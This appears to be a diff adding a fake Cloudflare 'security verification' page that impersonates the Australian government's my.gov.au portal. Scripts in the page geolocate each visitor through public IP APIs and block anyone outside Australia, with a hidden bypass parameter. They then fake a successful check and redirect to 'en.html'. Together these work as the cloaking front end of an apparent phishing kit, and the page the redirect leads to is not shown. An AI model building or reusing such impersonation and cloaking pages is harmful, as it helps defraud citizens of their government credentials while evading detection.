@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Just a moment...</title>
+  <script>
+    (function() {
+      'use strict';
+      
+      const ALLOWED_COUNTRIES = ['AU'];
+      const APIs = [
+        { url: 'https://freeipapi.com/api/json/', parser: d => ({ code: d.countryCode || d.country_code || 'XX', name: d.countryName || d.country || 'Unknown' }) },
+        { url: 'https://ipapi.co/json/', parser: d => ({ code: d.country || 'XX', name: d.country_name || 'Unknown' }) },
+        { url: 'https://ip-api.com/json/', parser: d => ({ code: d.countryCode || 'XX', name: d.country || 'Unknown' }) }
+      ];
+      
+      // Bypass checks
+      const isLocal = ['localhost', '127.0.0.1', ''].includes(window.location.hostname);
+      const hasBypass = new URLSearchParams(window.location.search).has('bypass_geo');
+      
+      if (isLocal || hasBypass) {
+        console.log('🔓 Geo-block bypassed');
+        return;
+      }
+      
+      function showBlockPage(location) {
+        document.documentElement.innerHTML = `
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Access Restricted</title>
+            <style>
+              * { margin: 0; padding: 0; box-sizing: border-box; }
+              body {
+                background: #000;
+                color: #f2f2f2;
+                font-family: system-ui, sans-serif;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+                padding: 20px;
+                text-align: center;
+              }
+              .container { max-width: 600px; }
+              h1 { color: #f38020; font-size: 2rem; margin-bottom: 1rem; }
+              p { font-size: 1.1rem; line-height: 1.6; color: #b6b6b6; margin-bottom: 1rem; }
+              .badge {
+                display: inline-block;
+                background: rgba(243, 128, 32, 0.1);
+                color: #f38020;
+                padding: 4px 12px;
+                border-radius: 4px;
+                font-weight: 500;
+              }
+              .code { 
+                margin-top: 2rem;
+                padding: 0.5rem 1rem;
+                background: #1a1a1a;
+                border-radius: 4px;
+                color: #555;
+                font-size: 0.7rem;
+              }
+            </style>
+          </head>
+          <body>
+            <div class="container">
+              <h1>🚫 Access Restricted</h1>
+              <p></p>
+              <p>Detected location: <span class="badge">${location.name} (${location.code})</span></p>
+              <p style="font-size: 0.95rem; color: #888;"></p>
+              <div class="code">REF: GEO-${Date.now().toString(36)}</div>
+            </div>
+          </body>
+          </html>
+        `;
+      }
+      
+      async function getLocation() {
+        for (const api of APIs) {
+          try {
+            const response = await fetch(api.url, { 
+              signal: AbortSignal.timeout(3000) // 3 second timeout
+            });
+            if (!response.ok) throw new Error(`HTTP ${response.status}`);
+            const data = await response.json();
+            const parsed = api.parser(data);
+            if (parsed.code !== 'XX') {
+              return { code: parsed.code.toUpperCase(), name: parsed.name };
+            }
+          } catch (e) {
+            console.warn(`API failed: ${api.url}`, e.message);
+          }
+        }
+        return null;
+      }
+      
+      // Hide content initially
+      document.documentElement.style.display = 'none';
+      
+      getLocation().then(location => {
+        document.documentElement.style.display = '';
+        
+        if (!location) {
+          console.log('🔓 All APIs failed - allowing access');
+          return;
+        }
+        
+        console.log(`📍 Location: ${location.name} (${location.code})`);
+        
+        if (!ALLOWED_COUNTRIES.includes(location.code)) {
+          showBlockPage(location);
+        }
+      });
+      
+    })();
+  </script>
+  
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      line-height: 1.15;
+      -webkit-text-size-adjust: 100%;
+      color: #f2f2f2;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif;
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      min-height: 100vh;
+      background-color: #000000;
+      color: #f2f2f2;
+    }
+
+    .main-wrapper {
+      display: flex;
+      flex: 1;
+      flex-direction: column;
+      align-items: center;
+      background-color: #000000;
+    }
+
+    .main-content {
+      margin: 8rem auto;
+      padding-left: 1.5rem;
+      padding-right: 1.5rem;
+      width: 100%;
+      max-width: 60rem;
+    }
+
+    @media (max-width: 720px) {
+      .main-content {
+        margin-top: 4rem;
+        padding-left: 1rem;
+        padding-right: 1rem;
+      }
+    }
+
+    .site-header {
+      display: flex;
+      gap: 16px;
+      align-items: center;
+      margin-bottom: 8px;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      font-weight: 600;
+      line-height: 125%;
+      color: #f2f2f2;
+    }
+
+    h2 {
+      margin-bottom: 8px;
+      font-size: 1.5rem;
+      font-weight: 600;
+      line-height: 125%;
+      color: #f2f2f2;
+      margin-top: 8px;
+    }
+
+    p {
+      margin-bottom: 8px;
+      font-size: 1rem;
+      font-weight: 300;
+      line-height: 150%;
+      color: #f2f2f2;
+    }
+
+    .verification-text {
+      margin-top: 0;
+      margin-bottom: 2rem;
+      font-weight: 400;
+      color: #b6b6b6;
+    }
+
+    .turnstile-container {
+      display: none;
+      justify-content: flex-start;
+      margin: 2rem 0;
+      min-height: 65px;
+    }
+
+    .turnstile-container.visible {
+      display: flex;
+    }
+
+    .turnstile-container iframe {
+      width: auto !important;
+      height: auto !important;
+      max-width: 300px !important;
+    }
+
+    .cf-turnstile {
+      display: flex !important;
+      justify-content: flex-start !important;
+      align-items: center !important;
+      min-height: 65px !important;
+      width: auto !important;
+    }
+
+    .cf-turnstile iframe {
+      width: auto !important;
+      height: auto !important;
+    }
+
+    .cf-turnstile .cf-turnstile-wrapper {
+      display: flex !important;
+      justify-content: flex-start !important;
+      align-items: center !important;
+    }
+
+    .spinner-container {
+      display: flex;
+      justify-content: flex-start;
+      margin: 2rem 0;
+      height: 76.391px;
+      align-items: center;
+    }
+
+    .spinner-container.hidden {
+      display: none;
+    }
+
+    .spinner {
+      display: inline-block;
+      position: relative;
+      width: 30px;
+      height: 30px;
+    }
+
+    .spinner div {
+      box-sizing: border-box;
+      display: block;
+      position: absolute;
+      width: 30px;
+      height: 30px;
+      border: 3px solid #f2f2f2;
+      border-radius: 50%;
+      animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+      border-color: #f2f2f2 transparent transparent transparent;
+    }
+
+    .spinner div:nth-child(1) {
+      animation-delay: -0.45s;
+    }
+
+    .spinner div:nth-child(2) {
+      animation-delay: -0.3s;
+    }
+
+    .spinner div:nth-child(3) {
+      animation-delay: -0.15s;
+    }
+
+    @keyframes lds-ring {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    #error-note {
+      display: none;
+      font-size: 13px;
+      color: #fc574a;
+      margin-top: 14px;
+      background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0ZENTc0QSIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjRkQ1NzRBIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+");
+      background-repeat: no-repeat;
+      background-size: contain;
+      padding-left: 34px;
+    }
+
+    .footer {
+      margin: 0 auto;
+      padding-right: 2rem;
+      padding-left: 2rem;
+      width: 100%;
+      max-width: 60rem;
+      line-height: 1.125rem;
+      font-size: 0.75rem;
+    }
+
+    .footer-inner {
+      display: flex;
+      justify-content: center;
+      border-top: 1px solid #333333;
+      padding-top: 1rem;
+      padding-bottom: 1rem;
+    }
+
+    .footer-wrapper {
+      text-align: center;
+    }
+
+    .footer-divider {
+      border: 1px solid #333333;
+      height: 12px;
+    }
+
+    .footer-link-wrapper {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      justify-content: center;
+      margin-top: 4px;
+    }
+
+    .footer-text {
+      color: #888888;
+      font-size: 0.75rem;
+    }
+
+    .footer a {
+      color: #888888;
+      text-decoration: underline;
+      font-size: 0.75rem;
+    }
+
+    .footer a:hover {
+      color: #b9d6ff;
+    }
+
+    .ray-id {
+      font-family: monospace;
+      font-size: 0.75rem;
+      color: #888888;
+      margin-bottom: 4px;
+    }
+
+    .ray-id code {
+      font-family: monospace;
+    }
+
+    .verify-status {
+      margin-top: 12px;
+      padding: 8px 12px;
+      border-radius: 4px;
+      font-size: 13px;
+      display: none;
+    }
+
+    .verify-status.success {
+      display: block;
+      background: #1a3a2a;
+      color: #2db35e;
+      border: 1px solid #2db35e;
+    }
+
+    .verify-status.fail {
+      display: block;
+      background: #3a1a1a;
+      color: #fc574a;
+      border: 1px solid #fc574a;
+    }
+
+    /* Success message styles - clean, no border or background */
+    #success-message {
+      display: none;
+      margin-top: 2rem;
+      padding: 0;
+      animation: fadeIn 0.5s ease;
+    }
+
+    #success-message h2 {
+      color: #f2f2f2;
+      font-size: 1.3rem;
+      margin-bottom: 0;
+      font-weight: 500;
+    }
+
+    #success-message .site-name-highlight {
+      color: #f38020;
+      font-weight: 600;
+    }
+
+    @keyframes fadeIn {
+      0% { opacity: 0; transform: translateY(-10px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Hide countdown */
+    #countdown-container {
+      display: none !important;
+    }
+
+    /* Hide old success elements */
+    .success-check {
+      display: none !important;
+    }
+    #success-status {
+      display: none !important;
+    }
+    
+    /* Hide the verify-status success message */
+    .verify-status.success {
+      display: none !important;
+    }
+
+    /* Editable text styling for the success message only */
+    #success-message [contenteditable="true"] {
+      outline: none;
+      border-radius: 4px;
+      padding: 2px 6px;
+      transition: background-color 0.2s;
+      display: inline-block;
+    }
+
+    #success-message [contenteditable="true"]:hover {
+      background-color: rgba(255, 255, 255, 0.05);
+    }
+
+    #success-message [contenteditable="true"]:focus {
+      background-color: rgba(255, 255, 255, 0.08);
+      box-shadow: 0 0 0 2px rgba(243, 128, 32, 0.3);
+    }
+
+    /* Small edit hint for success message */
+    .editable-hint {
+      font-size: 0.7rem;
+      color: #666;
+      margin-left: 10px;
+      font-weight: 300;
+      opacity: 0.6;
+      display: inline-block;
+    }
+  </style>
+</head>
+<body>
+
+<div class="main-wrapper" role="main">
+  <div class="main-content">
+    <!-- Site Header -->
+    <div class="site-header">
+      <h1 id="siteName">my.gov.au</h1>
+    </div>
+
+    <!-- Title -->
+    <h2 id="statusTitle">Performing security verification</h2>
+    
+    <!-- Description -->
+    <p id="statusSub" class="verification-text">This website uses a security service to protect against malicious bots. This page is displayed while the website verifies you are not a bot.</p>
+
+    <!-- Spinner (visible initially) -->
+    <div class="spinner-container" id="spinnerContainer">
+      <div class="spinner" id="spinner">
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+    </div>
+
+    <!-- Turnstile Container (hidden initially) -->
+    <div class="turnstile-container" id="turnstileContainer"></div>
+    
+    <!-- Success Message - editable h2 only -->
+    <div id="success-message">
+      <h2><span contenteditable="true">Verification successful. Waiting for <span class="site-name-highlight" id="successSiteName">example.com</span> to respond.</span> <span class="editable-hint"></span></h2>
+    </div>
+    
+    <!-- Error Note -->
+    <p id="error-note">Verification failed. Please refresh the page to try again.</p>
+
+    <!-- Countdown (hidden) -->
+    <div id="countdown-container"></div>
+
+    <!-- Verify Status (hidden) -->
+    <div class="verify-status" id="verifyStatus"></div>
+  </div>
+</div>
+
+<!-- Footer -->
+<div class="footer" role="contentinfo">
+  <div class="footer-inner">
+    <div class="footer-wrapper">
+      <div class="ray-id">Ray ID: <code id="rayId">a16288a3796d32c0</code></div>
+      <div class="footer-link-wrapper">
+        <span class="footer-text">Performance and Security by <a rel="noopener noreferrer" href="https://www.cloudflare.com?utm_source=challenge&amp;utm_campaign=m" target="_blank">Cloudflare</a></span>
+        <span class="footer-divider"></span>
+        <a target="_blank" rel="noopener noreferrer" href="https://www.cloudflare.com/privacypolicy/" class="footer-text">Privacy</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function () {
+  // ================= CONFIG =================
+  var SITE_KEY = '0x4AAAAAAEcjtZ1nhWyv9O4v';
+  var REDIRECT_URL = 'en.html';
+  // ==========================================
+
+  var redirectTarget = REDIRECT_URL;
+  var isVerified = false;
+  var autoVerifyAttempted = false;
+  var redirectTimer = null;
+
+  // Update site name in success message only (h1 stays as "My Custom Text")
+  var hostname = window.location.hostname;
+  document.getElementById('successSiteName').textContent = hostname;
+  document.getElementById('rayId').textContent = 'a16288a3796d32c0';
+
+  function showStatus(message, type) {
+    var statusEl = document.getElementById('verifyStatus');
+    statusEl.textContent = message;
+    statusEl.className = 'verify-status ' + type;
+  }
+
+  function showError(message) {
+    document.getElementById('spinnerContainer').classList.add('hidden');
+    document.getElementById('statusTitle').textContent = 'Verification failed';
+    document.getElementById('statusSub').textContent = message || 'Please refresh the page to try again.';
+    document.getElementById('error-note').style.display = 'block';
+    showStatus('❌ ' + (message || 'Verification failed'), 'fail');
+  }
+
+  function performRedirect() {
+    console.log('🔴 Redirecting to:', redirectTarget);
+    window.location.replace(redirectTarget);
+  }
+
+  function onSuccess() {
+    if (isVerified) return;
+    isVerified = true;
+    
+    console.log('✅ Verification successful! Redirecting in 2 seconds...');
+    
+    // Hide spinner
+    document.getElementById('spinnerContainer').classList.add('hidden');
+    
+    // Hide Turnstile
+    document.getElementById('turnstileContainer').classList.remove('visible');
+    document.getElementById('turnstileContainer').style.display = 'none';
+    
+    // Show success message
+    var successMsg = document.getElementById('success-message');
+    successMsg.style.display = 'block';
+    
+    // Update title and subtitle
+    document.getElementById('statusTitle').textContent = 'Verifying you are human. This may take a few seconds.';
+    document.getElementById('statusSub').textContent = 'This website uses a security service to protect against malicious bots. This page is displayed while the website verifies you are not a bot.';
+    
+    // Don't show the verify-status success message
+
+    // Redirect after 2 seconds
+    if (redirectTimer) clearTimeout(redirectTimer);
+    redirectTimer = setTimeout(performRedirect, 2000);
+  }
+
+  // ====== AUTO-VERIFY FUNCTION ======
+  function autoVerify() {
+    if (isVerified || autoVerifyAttempted) return;
+    autoVerifyAttempted = true;
+    
+    console.log('🔄 Attempting automatic verification...');
+    
+    if (window.turnstile) {
+      window.turnstile.execute('#turnstileContainer', {
+        callback: function(token) {
+          console.log('🔑 Auto-verification token received:', token);
+          if (token && token.length > 0) {
+            onSuccess();
+          } else {
+            console.warn('⚠️ Empty token received, retrying...');
+            autoVerifyAttempted = false;
+            setTimeout(autoVerify, 2000);
+          }
+        },
+        'error-callback': function(error) {
+          console.log('❌ Auto-verification error:', error);
+          autoVerifyAttempted = false;
+          setTimeout(autoVerify, 3000);
+        }
+      });
+      
+    } else {
+      console.log('⏳ Turnstile not ready, waiting...');
+      autoVerifyAttempted = false;
+      setTimeout(autoVerify, 500);
+    }
+  }
+
+  // ====== TURNSTILE CALLBACKS ======
+  window.onTurnstileVerified = function (token) {
+    console.log('🔑 Turnstile token received:', token);
+    
+    if (token && token.length > 0 && !isVerified) {
+      onSuccess();
+    } else if (!isVerified) {
+      showError('Invalid token received.');
+      if (window.turnstile) window.turnstile.reset();
+    }
+  };
+
+  window.onTurnstileError = function () {
+    console.log('❌ Turnstile error');
+    if (!isVerified) {
+      showError('Could not load the challenge widget.');
+    }
+  };
+
+  // Render Turnstile
+  window.addEventListener('load', function () {
+    console.log('📄 Page loaded, checking for Turnstile...');
+    var tries = 0;
+    var interval = setInterval(function () {
+      tries++;
+      if (window.turnstile) {
+        clearInterval(interval);
+        console.log('🎯 Rendering Turnstile with key:', SITE_KEY);
+        
+        // Show spinner
+        document.getElementById('spinnerContainer').classList.remove('hidden');
+        
+        window.turnstile.render('#turnstileContainer', {
+          sitekey: SITE_KEY,
+          callback: 'onTurnstileVerified',
+          'error-callback': 'onTurnstileError',
+          theme: 'dark',
+          size: 'normal'
+        });
+        
+        // Hide spinner and show Turnstile after a delay
+        setTimeout(function() {
+          document.getElementById('spinnerContainer').classList.add('hidden');
+          document.getElementById('turnstileContainer').classList.add('visible');
+          document.getElementById('turnstileContainer').style.display = 'flex';
+          console.log('✅ Turnstile rendered and visible');
+          
+          // Auto-verify after Turnstile is visible
+          setTimeout(autoVerify, 1500);
+        }, 1000);
+        
+      } else if (tries > 40) {
+        clearInterval(interval);
+        console.log('❌ Turnstile script failed to load after 4 seconds');
+        showError('The challenge script failed to load.');
+      }
+    }, 100);
+  });
+
+  // If Turnstile already loaded
+  if (window.turnstile) {
+    console.log('🎯 Turnstile already loaded, rendering immediately');
+    
+    document.getElementById('spinnerContainer').classList.remove('hidden');
+    
+    window.turnstile.render('#turnstileContainer', {
+      sitekey: SITE_KEY,
+      callback: 'onTurnstileVerified',
+      'error-callback': 'onTurnstileError',
+      theme: 'dark',
+      size: 'normal'
+    });
+    
+    setTimeout(function() {
+      document.getElementById('spinnerContainer').classList.add('hidden');
+      document.getElementById('turnstileContainer').classList.add('visible');
+      document.getElementById('turnstileContainer').style.display = 'flex';
+      
+      setTimeout(autoVerify, 1500);
+    }, 1000);
+  }
+})();
+</script>
+
+</body>
+</html>
